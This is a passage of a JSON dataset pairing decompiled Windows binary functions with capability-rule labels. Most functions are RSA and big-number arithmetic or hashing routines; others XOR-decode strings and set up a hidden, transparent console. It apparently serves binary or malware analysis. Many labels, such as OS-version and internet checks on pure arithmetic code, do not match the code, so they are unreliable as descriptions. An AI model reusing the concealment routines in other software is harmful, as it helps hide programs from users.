        "token_count": 2527
    },
    "0040d130": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d130(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = *(arg_8h + 4);\n    iVar4 = arg_8h + 8;\n    uVar1 = fcn.0040c420(iVar4);\n    if ((uVar3 == uVar1) && (uVar3 < 0x401)) {\n        iVar2 = fcn.00409e40(iVar4, 0);\n        if (0 < iVar2) {\n            iVar2 = fcn.0040b440(iVar4, 0);\n            if (iVar2 != 0) {\n                arg_8h = arg_8h + 0x14;\n                iVar2 = fcn.00409e40(arg_8h, 0);\n                if (0 < iVar2) {\n                    uVar3 = fcn.00409d40(iVar4);\n                    if (0x7f < uVar3) {\n                        iVar2 = fcn.0040b440(arg_8h, 0);\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00409d40(arg_8h);\n                            if (1 < uVar3) {\n                                iVar4 = fcn.00409e80(arg_8h, iVar4);\n                                if (iVar4 < 0) {\n                                    return 0;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return 0xffffbe00;\n}\n",
        "token_count": 359
    },
    "0040d1d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040d1d0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409e40(arg_8h + 8, 0);\n    if (((((iVar1 == 0) || (iVar1 = fcn.00409e40(arg_8h + 0x2c, 0),  iVar1 == 0)) ||\n         (iVar1 = fcn.00409e40(arg_8h + 0x38, 0),  iVar1 == 0)) ||\n        ((iVar1 = fcn.00409e40(arg_8h + 0x20, 0),  iVar1 == 0 || (iVar1 = fcn.00409e40(arg_8h + 0x14, 0),  iVar1 == 0)))\n        ) && ((arg_10h != 0 || ((arg_14h != 0 || (arg_18h != 0)))))) {\n        return -0x4080;\n    }\n    if ((arg_ch != 0) && (iVar1 = fcn.00409f60(arg_ch, arg_8h + 8),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if ((arg_10h != 0) && (iVar1 = fcn.00409f60(arg_10h, arg_8h + 0x2c),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if ((arg_14h != 0) && (iVar1 = fcn.00409f60(arg_14h, arg_8h + 0x38),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if ((arg_18h != 0) && (iVar1 = fcn.00409f60(arg_18h, arg_8h + 0x20),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if ((arg_1ch != 0) && (iVar1 = fcn.00409f60(arg_1ch, arg_8h + 0x14),  iVar1 != 0)) {\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 540
    },
    "0040d800": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040d800(int32_t arg_8h, code *arg_ch, uint arg_10h, int32_t arg_14h, uint32_t arg_18h, uint arg_1ch, uchar *arg_20h\n            )\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    if (*(arg_8h + 0xa4) != 0) {\n        return -0x4100;\n    }\n    if ((arg_18h + 0xb < arg_18h) || (*(arg_8h + 4) < arg_18h + 0xb)) {\n        return -0x4080;\n    }\n    iVar2 = (*(arg_8h + 4) - arg_18h) + -3;\n    *arg_20h = 0;\n    pcVar3 = arg_20h + 1;\n    if (arg_14h == 0) {\n        if (arg_ch == NULL) {\n            return -0x4080;\n        }\n        *pcVar3 = '\\x02';\n        pcVar3 = arg_20h + 2;\n        while (iVar2 != 0) {\n            iVar2 = iVar2 + -1;\n            iVar4 = 100;\n            do {\n                iVar1 = (*arg_ch)(arg_10h, pcVar3, 1);\n                if (*pcVar3 != '\\0') break;\n                iVar4 = iVar4 + -1;\n                if (iVar4 == 0) goto code_r0x0040d8bd;\n            } while (iVar1 == 0);\n            if ((iVar4 == 0) || (iVar1 != 0)) {\ncode_r0x0040d8bd:\n                return iVar1 + -0x4480;\n            }\n            pcVar3 = pcVar3 + 1;\n        }\n    }\n    *pcVar3 = '\\0';\n    fcn.004124d0(pcVar3 + 1, arg_1ch, arg_18h);\n    if (arg_14h != 0) {\n        iVar2 = fcn.0040d8f0(arg_8h, arg_ch, arg_10h, arg_20h, arg_20h);\n        return iVar2;\n    }\n    iVar2 = fcn.0040de20(arg_8h, arg_20h, arg_20h);\n    return iVar2;\n}\n",
        "token_count": 549
    },
    "0040d8f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d8f0(uint *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_7ch;\n    uint var_70h;\n    uint var_64h;\n    uint var_58h;\n    uint var_4ch;\n    uint var_40h;\n    uint var_34h;\n    uint var_28h;\n    uint var_1ch;\n    uint var_10h;\n    uint *var_4h;\n    \n    iVar1 = arg_8h;\n    var_4h = arg_8h + 0x50;\n    iVar3 = fcn.0040df30(arg_8h, 1);\n    if (iVar3 != 0) {\n        return -0x4080;\n    }\n    fcn.0040b4e0(&var_10h);\n    fcn.0040b4e0(&var_58h);\n    fcn.0040b4e0(&var_64h);\n    fcn.0040b4e0(&var_28h);\n    if (arg_ch != 0) {\n        fcn.0040b4e0(&var_34h);\n        fcn.0040b4e0(&var_40h);\n    }\n    fcn.0040b4e0(&var_1ch);\n    fcn.0040b4e0(&var_4ch);\n    fcn.0040b4e0(&var_7ch);\n    fcn.0040b4e0(&var_70h);\n    iVar3 = fcn.0040c0e0(&var_10h, arg_14h, *(arg_8h + 4));\n    if (iVar3 == 0) {\n        iVar3 = fcn.00409e80(&var_10h, arg_8h + 8);\n        if (iVar3 < 0) {\n            iVar4 = fcn.00409f60(&var_7ch, &var_10h);\n            iVar3 = iVar4;\n            if (iVar4 == 0) {\n                puVar2 = arg_8h + 0x44;\n                if (arg_ch != 0) {\n                    arg_8h_00 = arg_8h + 0x8c;\n                    if (*(arg_8h + 0xa0) == 0) {\n                        do {\n                            iVar4 = iVar4 + 1;\n                            iVar3 = fcn.0040acd0(arg_8h + 0x98, *(arg_8h + 4) + -1, arg_ch, arg_10h);\n                            if ((iVar3 != 0) ||\n                               (iVar3 = fcn.0040ae20(arg_8h_00, arg_8h + 0x98, arg_8h + 8),  iVar3 != 0))\n                            goto code_r0x0040dd97;\n                            iVar3 = fcn.00409e40(arg_8h_00, 1);\n                            if (iVar3 == 0) {\n                                iVar3 = fcn.0040b500(arg_8h_00, arg_8h + 0x98, arg_8h + 8);\n                                if (iVar3 != 0) goto code_r0x0040dd97;\n                                iVar3 = fcn.0040a5e0(arg_8h_00, arg_8h_00, arg_8h + 0x14, arg_8h + 8, arg_8h + 0x68);\n                                goto code_r0x0040db01;\n                            }\n                        } while (iVar4 < 0xb);\n                        iVar3 = -0x4480;\n                        goto code_r0x0040dd97;\n                    }\n                    iVar3 = fcn.0040bf10(arg_8h_00, arg_8h_00, arg_8h_00);\n                    if ((iVar3 != 0) || (iVar3 = fcn.0040bd30(arg_8h_00, arg_8h_00, arg_8h + 8),  iVar3 != 0))\n                    goto code_r0x0040dd97;\n                    iVar3 = arg_8h + 0x98;\n                    iVar3 = fcn.0040bf10(iVar3, iVar3, iVar3);\n                    if (iVar3 != 0) goto code_r0x0040dd97;\n                    iVar3 = fcn.0040bd30(arg_8h + 0x98, arg_8h + 0x98, arg_8h + 8);\ncode_r0x0040db01:\n                    if (((((iVar3 != 0) || (iVar3 = fcn.0040bf10(&var_10h, &var_10h, arg_8h_00),  iVar3 != 0)) ||\n                         (iVar3 = fcn.0040bd30(&var_10h, &var_10h, arg_8h + 8),  iVar3 != 0)) ||\n                        ((iVar3 = fcn.0040c510(&var_58h, arg_8h + 0x2c, 1),  iVar3 != 0 ||\n                         (iVar3 = fcn.0040c510(&var_64h, arg_8h + 0x38, 1),  iVar3 != 0)))) ||\n                       ((iVar3 = fcn.0040acd0(&var_28h, 0x1c, arg_ch, arg_10h),  iVar3 != 0 ||\n                        ((iVar3 = fcn.0040bf10(&var_34h, &var_58h, &var_28h),  iVar3 != 0 ||\n                         (iVar3 = fcn.00409cd0(&var_34h, &var_34h, arg_8h + 0x44),  iVar3 != 0))))))\n                    goto code_r0x0040dd97;\n                    iVar3 = fcn.0040acd0(&var_28h, 0x1c, arg_ch, arg_10h);\n                    if ((iVar3 != 0) ||\n                       ((iVar3 = fcn.0040bf10(&var_40h, &var_64h, &var_28h),  iVar3 != 0 ||\n                        (iVar3 = fcn.00409cd0(&var_40h, &var_40h, arg_8h + 0x50),  iVar3 != 0)))) goto code_r0x0040dd97;\n                    var_4h = &var_40h;\n                    puVar2 = &var_34h;\n                }\n                arg_8h = puVar2;\n                iVar3 = fcn.0040a5e0(&var_1ch, &var_10h, arg_8h, iVar1 + 0x2c, iVar1 + 0x74);\n                if (((((iVar3 == 0) &&\n                      (iVar3 = fcn.0040a5e0(&var_4ch, &var_10h, var_4h, iVar1 + 0x38, iVar1 + 0x80),  iVar3 == 0)) &&\n                     (iVar3 = fcn.0040c550(&var_10h, &var_1ch, &var_4ch),  iVar3 == 0)) &&\n                    (((iVar3 = fcn.0040bf10(&var_1ch, &var_10h, iVar1 + 0x5c),  iVar3 == 0 &&\n                      (iVar3 = fcn.0040bd30(&var_10h, &var_1ch, iVar1 + 0x2c),  iVar3 == 0)) &&\n                     ((iVar3 = fcn.0040bf10(&var_1ch, &var_10h, iVar1 + 0x38),  iVar3 == 0 &&\n                      (iVar3 = fcn.00409cd0(&var_10h, &var_4ch, &var_1ch),  iVar3 == 0)))))) &&\n                   (((arg_ch == 0 ||\n                     ((iVar3 = fcn.0040bf10(&var_10h, &var_10h, iVar1 + 0x98),  iVar3 == 0 &&\n                      (iVar3 = fcn.0040bd30(&var_10h, &var_10h, iVar1 + 8),  iVar3 == 0)))) &&\n                    (iVar3 = fcn.0040a5e0(&var_70h, &var_10h, iVar1 + 0x14, iVar1 + 8, iVar1 + 0x68),  iVar3 == 0)))) {\n                    iVar3 = fcn.00409e80(&var_70h, &var_7ch);\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.0040c5f0(&var_10h, arg_18h, *(iVar1 + 4));\n                    }\n                    else {\n                        iVar3 = -0x4380;\n                    }\n                }\n            }\n        }\n        else {\n            iVar3 = -4;\n        }\n    }\ncode_r0x0040dd97:\n    fcn.0040add0(&var_58h);\n    fcn.0040add0(&var_64h);\n    fcn.0040add0(&var_28h);\n    if (arg_ch != 0) {\n        fcn.0040add0(&var_34h);\n        fcn.0040add0(&var_40h);\n    }\n    fcn.0040add0(&var_10h);\n    fcn.0040add0(&var_1ch);\n    fcn.0040add0(&var_4ch);\n    fcn.0040add0(&var_70h);\n    fcn.0040add0(&var_7ch);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    return iVar3 + -0x4300;\n}\n",
        "token_count": 2286
    },
    "0040e980": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e980(uint32_t *arg_8h, uchar *arg_ch)\n\n{\n    uint32_t *arg_ch_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *arg_8h_00;\n    int32_t iVar4;\n    \n    uVar2 = *arg_8h & 0x3f;\n    arg_ch_00 = arg_8h + 10;\n    *(uVar2 + 0x28 + arg_8h) = 0x80;\n    uVar3 = uVar2 + 1;\n    arg_8h_00 = arg_8h + uVar2 + 0x29;\n    if (uVar3 < 0x39) {\n        iVar1 = 0x38 - uVar3;\n        iVar4 = 0;\n    }\n    else {\n        fcn.004124f0(arg_8h_00, 0, 0x40 - uVar3);\n        iVar4 = fcn.0040e030(arg_8h, arg_ch_00);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        iVar1 = 0x38;\n        arg_8h_00 = arg_ch_00;\n    }\n    fcn.004124f0(arg_8h_00, iVar4, iVar1);\n    iVar1 = arg_8h[1] << 3;\n    iVar4 = *arg_8h << 3;\n    *(arg_8h + 99) = iVar1 | *arg_8h >> 0x1d;\n    *(arg_8h + 0x18) = iVar1 >> 0x18;\n    *(arg_8h + 0x61) = iVar1 >> 0x10;\n    *(arg_8h + 0x62) = iVar1 >> 8;\n    *(arg_8h + 0x19) = iVar4 >> 0x18;\n    *(arg_8h + 0x65) = iVar4 >> 0x10;\n    *(arg_8h + 0x66) = iVar4 >> 8;\n    *(arg_8h + 0x67) = iVar4;\n    iVar4 = fcn.0040e030(arg_8h, arg_ch_00);\n    if (iVar4 == 0) {\n        *arg_ch = *(arg_8h + 0xb);\n        arg_ch[1] = *(arg_8h + 10);\n        arg_ch[2] = arg_8h[2] >> 8;\n        arg_ch[3] = *(arg_8h + 2);\n        arg_ch[4] = *(arg_8h + 0xf);\n        arg_ch[5] = *(arg_8h + 0xe);\n        arg_ch[6] = arg_8h[3] >> 8;\n        arg_ch[7] = *(arg_8h + 3);\n        arg_ch[8] = *(arg_8h + 0x13);\n        arg_ch[9] = *(arg_8h + 0x12);\n        arg_ch[10] = arg_8h[4] >> 8;\n        arg_ch[0xb] = *(arg_8h + 4);\n        arg_ch[0xc] = *(arg_8h + 0x17);\n        arg_ch[0xd] = *(arg_8h + 0x16);\n        arg_ch[0xe] = arg_8h[5] >> 8;\n        arg_ch[0xf] = *(arg_8h + 5);\n        arg_ch[0x10] = *(arg_8h + 0x1b);\n        arg_ch[0x11] = *(arg_8h + 0x1a);\n        arg_ch[0x12] = arg_8h[6] >> 8;\n        arg_ch[0x13] = *(arg_8h + 6);\n        arg_ch[0x14] = *(arg_8h + 0x1f);\n        arg_ch[0x15] = *(arg_8h + 0x1e);\n        arg_ch[0x16] = arg_8h[7] >> 8;\n        arg_ch[0x17] = *(arg_8h + 7);\n        arg_ch[0x18] = *(arg_8h + 0x23);\n        arg_ch[0x19] = *(arg_8h + 0x22);\n        arg_ch[0x1a] = arg_8h[8] >> 8;\n        arg_ch[0x1b] = *(arg_8h + 8);\n        if (arg_8h[0x1a] == 0) {\n            arg_ch[0x1c] = *(arg_8h + 0x27);\n            arg_ch[0x1d] = *(arg_8h + 0x26);\n            arg_ch[0x1e] = arg_8h[9] >> 8;\n            arg_ch[0x1f] = *(arg_8h + 9);\n        }\n        iVar4 = 0;\n    }\n    return iVar4;\n}\n",
        "token_count": 1174
    },
    "0040ee70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040ee70(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_ch;\n    \n    iVar2 = 0;\n    fcn.0040b4e0(&var_ch);\n    fcn.0040b4e0(&var_18h);\n    if (arg_14h == 0) {\ncode_r0x0040ef05:\n        if (arg_18h == 0) {\ncode_r0x0040ef73:\n            if (arg_1ch == 0) goto code_r0x0040eff4;\n            if ((arg_8h == 0) || (arg_ch == 0)) goto code_r0x0040efef;\n            iVar2 = fcn.0040bf10(&var_ch, arg_1ch, arg_ch);\n            if (iVar2 == 0) {\n                iVar2 = fcn.0040c510(&var_ch, &var_ch, 1);\n                if (iVar2 == 0) {\n                    iVar2 = fcn.0040bd30(&var_ch, &var_ch, arg_8h);\n                    if (iVar2 == 0) {\n                        iVar1 = fcn.00409e40(&var_ch, 0);\n                        if (iVar1 == 0) goto code_r0x0040eff4;\n                        goto code_r0x0040efd0;\n                    }\n                }\n            }\n        }\n        else {\n            if (arg_ch == 0) goto code_r0x0040efef;\n            iVar2 = fcn.0040c510(&var_ch, arg_ch, 1);\n            if (iVar2 == 0) {\n                iVar2 = fcn.0040c550(&var_18h, arg_18h, arg_10h);\n                if (iVar2 == 0) {\n                    iVar2 = fcn.0040bd30(&var_18h, &var_18h, &var_ch);\n                    if (iVar2 == 0) {\n                        iVar1 = fcn.00409e40(&var_18h, 0);\n                        if (iVar1 != 0) goto code_r0x0040efd0;\n                        goto code_r0x0040ef73;\n                    }\n                }\n            }\n        }\n    }\n    else {\n        if (arg_8h == 0) {\ncode_r0x0040efef:\n            iVar2 = -0x4080;\n            goto code_r0x0040eff4;\n        }\n        iVar2 = fcn.0040c510(&var_ch, arg_8h, 1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.0040c550(&var_18h, arg_14h, arg_10h);\n            if (iVar2 == 0) {\n                iVar2 = fcn.0040bd30(&var_18h, &var_18h, &var_ch);\n                if (iVar2 == 0) {\n                    iVar1 = fcn.00409e40(&var_18h, 0);\n                    if (iVar1 == 0) goto code_r0x0040ef05;\ncode_r0x0040efd0:\n                    iVar2 = -0x4200;\n                    goto code_r0x0040eff4;\n                }\n            }\n        }\n    }\n    if ((iVar2 != -0x4200) && (iVar2 != -0x4080)) {\n        iVar2 = iVar2 + -0x4200;\n    }\ncode_r0x0040eff4:\n    fcn.0040add0(&var_ch);\n    fcn.0040add0(&var_18h);\n    return iVar2;\n}\n",
        "token_count": 867
    },
    "0040f020": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040f020(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_ch;\n    \n    iVar2 = 0;\n    fcn.0040b4e0(&var_ch);\n    fcn.0040b4e0(&var_18h);\n    if ((arg_1ch == 0) ||\n       (((arg_ch == 0 || (iVar2 = fcn.0040bab0(arg_ch, 0x32, arg_1ch, arg_20h),  iVar2 == 0)) &&\n        ((arg_10h == 0 || (iVar2 = fcn.0040bab0(arg_10h, 0x32, arg_1ch, arg_20h),  iVar2 == 0)))))) {\n        if ((arg_ch == 0) || (arg_10h == 0)) {\ncode_r0x0040f0ec:\n            if (((arg_8h != 0) && ((arg_14h != 0 && (arg_18h != 0)))) &&\n               ((iVar1 = fcn.00409e40(arg_14h, 1),  iVar1 < 1 ||\n                (((iVar1 = fcn.00409e40(arg_18h, 1),  iVar1 < 1 || (iVar1 = fcn.00409e80(arg_14h, arg_8h),  -1 < iVar1))\n                 || (iVar1 = fcn.00409e80(arg_18h, arg_8h),  -1 < iVar1)))))) goto code_r0x0040f27c;\n        }\n        else if (arg_8h != 0) {\n            iVar2 = fcn.0040bf10(&var_ch, arg_ch, arg_10h);\n            if (iVar2 != 0) goto code_r0x0040f281;\n            iVar1 = fcn.00409e40(arg_8h, 1);\n            if ((iVar1 < 1) || (iVar1 = fcn.00409e80(&var_ch, arg_8h),  iVar1 != 0)) goto code_r0x0040f27c;\n            goto code_r0x0040f0ec;\n        }\n        if ((((arg_ch == 0) || (arg_10h == 0)) || ((arg_14h == 0 || (arg_18h == 0)))) ||\n           (((iVar2 = fcn.00409e40(arg_ch, 1),  0 < iVar2 && (iVar2 = fcn.00409e40(arg_10h, 1),  0 < iVar2)) &&\n            ((iVar2 = fcn.0040bf10(&var_ch, arg_14h, arg_18h),  iVar2 != 0 ||\n             ((((iVar2 = fcn.0040c510(&var_ch, &var_ch, 1),  iVar2 != 0 ||\n                (iVar2 = fcn.0040c510(&var_18h, arg_ch, 1),  iVar2 != 0)) ||\n               (iVar2 = fcn.0040bd30(&var_ch, &var_ch, &var_18h),  iVar2 != 0)) ||\n              ((iVar2 = fcn.00409e40(&var_ch, 0),  iVar2 == 0 &&\n               (((iVar2 = fcn.0040bf10(&var_ch, arg_14h, arg_18h),  iVar2 != 0 ||\n                 (iVar2 = fcn.0040c510(&var_ch, &var_ch, 1),  iVar2 != 0)) ||\n                ((iVar2 = fcn.0040c510(&var_18h, arg_10h, 1),  iVar2 != 0 ||\n                 ((iVar2 = fcn.0040bd30(&var_ch, &var_ch, &var_18h),  iVar2 != 0 ||\n                  (iVar1 = fcn.00409e40(&var_ch, 0),  iVar1 == 0)))))))))))))))) goto code_r0x0040f281;\n    }\ncode_r0x0040f27c:\n    iVar2 = -0x4200;\ncode_r0x0040f281:\n    fcn.0040add0(&var_ch);\n    fcn.0040add0(&var_18h);\n    if ((iVar2 == 0) || (iVar1 = iVar2 + -0x4200,  iVar2 == -0x4200)) {\n        iVar1 = iVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 1083
    },
    "0040f630": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040f630(char *arg_8h, uint arglist)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t in_FS_OFFSET;\n    uint ARG_0;\n    uint var_134h;\n    uint lpSystemTime;\n    ushort var_2ch;\n    ushort var_2ah;\n    uint var_28h;\n    uint var_21h;\n    uint uStack33;\n    uint uStack29;\n    uint uStack25;\n    ushort var_11h;\n    uchar var_fh;\n    uint var_eh;\n    uchar var_ah;\n    uchar var_9h;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    fcn.004124f0(&ARG_0, 0, 0x400);\n    var_8h = 0;\n    if (arg_8h != NULL) {\n        cVar2 = *arg_8h;\n        while (cVar2 != '\\0') {\n            var_8h = var_8h + 1;\n            cVar2 = arg_8h[var_8h];\n        }\n    }\n    iVar6 = (*_sym.imp.USER32.dll_wvsprintfA)(&ARG_0, arg_8h, &arglist);\n    pcVar4 = _sym.imp.USER32.dll_wsprintfA;\n    var_eh._0_1_ = 0x1c;\n    var_9h = 0;\n    var_eh._1_1_ = 0x25;\n    var_eh._2_1_ = 0x73;\n    var_ah = 10;\n    var_eh._3_1_ = 0xd;\n    (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, &var_eh + 1, &ARG_0);\n    (*_sym.imp.KERNEL32.dll_GetLocalTime)(&lpSystemTime);\n    uVar8 = 0;\n    var_21h = *0x423e60;\n    uStack33 = *0x423e64;\n    uStack29 = *0x423e68;\n    uStack25 = *0x423e6c;\n    var_11h = 0x3d40;\n    var_fh = 0;\n    do {\n        var_21h._0_1_ = *0x423e60;\n        puVar1 = &var_21h + uVar8 + 1;\n        *puVar1 = *puVar1 ^ var_21h;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x11);\n    var_fh = 0;\n    (*pcVar4)(&var_134h, &var_21h + 1, var_2ch, var_2ah, var_28h);\n    if ((var_8h <= iVar6) || (*(in_FS_OFFSET + 0x34) == 0)) {\n        iVar6 = *(in_FS_OFFSET + 0x30);\n        (*_sym.imp.ntdll.dll_RtlEnterCriticalSection)(0x426948);\n        pcVar5 = _sym.imp.KERNEL32.dll_SetConsoleTextAttribute;\n        (*_sym.imp.KERNEL32.dll_SetConsoleTextAttribute)(*(*(iVar6 + 0x10) + 0x1c), 10);\n        pcVar4 = _sym.imp.KERNEL32.dll_WriteFile;\n        iVar3 = 0;\n        while (var_134h != '\\0') {\n            var_134h._0_1_ = *(&var_134h + iVar3 + 1);\n            iVar3 = iVar3 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_WriteFile)(*(*(iVar6 + 0x10) + 0x1c), &var_134h, iVar3, &var_8h, 0);\n        (*pcVar5)(*(*(iVar6 + 0x10) + 0x1c), 0xf);\n        iVar3 = 0;\n        while (ARG_0 != '\\0') {\n            ARG_0._0_1_ = *(&ARG_0 + iVar3 + 1);\n            iVar3 = iVar3 + 1;\n        }\n        (*pcVar4)(*(*(iVar6 + 0x10) + 0x1c), &ARG_0, iVar3, &var_8h, 0);\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetConsoleWindow)();\n        iVar6 = (*_sym.imp.USER32.dll_IsWindowVisible)(uVar7);\n        if (iVar6 != 0) {\n            (*_sym.imp.USER32.dll_FlashWindow)(uVar7, 0);\n        }\n        (*_sym.imp.ntdll.dll_RtlLeaveCriticalSection)(0x426948);\n    }\n    return var_8h;\n}\n",
        "token_count": 1118
    },
    "0040f800": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040f800(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t in_FS_OFFSET;\n    uint uVar6;\n    uint uStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    int32_t iStack168;\n    uint uStack164;\n    uint uStack160;\n    uint32_t uStack156;\n    uint uStack152;\n    uchar *puStack148;\n    uint32_t uStack144;\n    uint uStack140;\n    uint32_t uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint32_t uStack120;\n    uint uStack116;\n    uint32_t uStack112;\n    uint32_t uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    code *pcStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint32_t uStack80;\n    uint uStack76;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint32_t uStack48;\n    \n    uStack76 = 0x40f812;\n    (*_sym.imp.KERNEL32.dll_AllocConsole)();\n    uStack76 = 0x40f818;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetConsoleWindow)();\n    pcVar2 = _sym.imp.USER32.dll_ShowWindow;\n    uStack76 = 0;\n    puStack84 = 0x40f825;\n    uStack80 = uVar3;\n    (*_sym.imp.USER32.dll_ShowWindow)();\n    uVar5 = 0;\n    uStack60 = str._c_LDmF_._0_4_;\n    uStack56 = str._c_LDmF_._4_4_;\n    uStack52 = *0x423b08;\n    uStack48 = *0x423b0c;\n    do {\n        uStack60._0_1_ = str._c_LDmF_._0_4_;\n        (&stack0xffffffc5)[uVar5] = (&stack0xffffffc5)[uVar5] ^ uStack60;\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0xe);\n    puStack84 = &stack0xffffffc5;\n    uStack48 = uStack48 & 0xffffff;\n    uStack88 = 0x40f851;\n    (*_sym.imp.KERNEL32.dll_SetConsoleTitleA)();\n    uStack88 = 1;\n    pcStack92 = fcn.0040f980;\n    uStack96 = 0x40f85e;\n    (*_sym.imp.KERNEL32.dll_SetConsoleCtrlHandler)();\n    uStack96 = 0;\n    uStack100 = 0;\n    uStack104 = 0x40f868;\n    (*_sym.imp.KERNEL32.dll_SetProcessShutdownParameters)();\n    uStack104 = 0xffffffec;\n    uStack112 = 0x40f871;\n    uStack108 = uVar3;\n    uStack112 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    uStack112 = uStack112 | 0x80000;\n    uStack116 = 0xffffffec;\n    uStack124 = 0x40f880;\n    uStack120 = uVar3;\n    (*_sym.imp.USER32.dll_SetWindowLongA)();\n    uStack124 = 2;\n    uStack128 = 0xbf;\n    uStack132 = 0;\n    uStack140 = 0x40f890;\n    uStack136 = uVar3;\n    (*_sym.imp.USER32.dll_SetLayeredWindowAttributes)();\n    uStack140 = 0;\n    puStack148 = 0x40f899;\n    uStack144 = uVar3;\n    iVar4 = (*_sym.imp.USER32.dll_GetSystemMenu)();\n    if (iVar4 != 0) {\n        puStack148 = 0x3;\n        uStack152 = 0xf060;\n        uStack160 = 0x40f8ad;\n        uStack156 = iVar4;\n        (*_sym.imp.USER32.dll_EnableMenuItem)();\n        uStack160 = 0;\n        uStack164 = 0xf060;\n        uStack172 = 0x40f8bb;\n        iStack168 = iVar4;\n        (*_sym.imp.USER32.dll_DeleteMenu)();\n    }\n    iVar4 = 